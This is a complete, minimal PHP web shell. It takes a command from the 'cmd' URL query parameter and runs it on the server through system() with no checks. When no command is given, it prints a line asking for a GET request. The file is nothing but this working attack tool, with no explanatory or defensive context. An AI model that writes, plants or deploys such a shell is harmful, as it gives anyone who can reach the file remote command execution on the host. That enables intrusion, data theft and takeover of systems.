<?php
    if(isset($_GET['cmd'])){
        system($_GET['cmd']);
    }
    else {
        print('send a get request with the command');
    }
?>
